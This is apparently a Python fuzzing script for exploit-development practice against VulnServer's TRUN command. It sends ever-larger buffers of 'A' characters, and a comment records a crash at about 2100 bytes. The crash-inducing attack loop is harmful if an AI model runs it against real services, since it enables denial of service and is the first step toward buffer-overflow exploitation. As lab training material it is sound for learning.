#!/usr/bin/python3
#around 2100 in linegth, the application crashes

#!/usr/bin/python3

import time
import sys,socket

print("******VulnServer********")
ip_address=input("Enter the IP address\n")
port=input("Enter the port number\n")

if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*40)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*40)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*40)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*40)
        print("Issues with the user input")

else:
    buffer=100
    while (buffer<10000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address, int(port)))
        print(f"****Sending buffer size: {buffer}****")
        s.send(b"TRUN /.:/ "+ b"A"*buffer)
        s.close()
        buffer=buffer+200
        time.sleep(2)

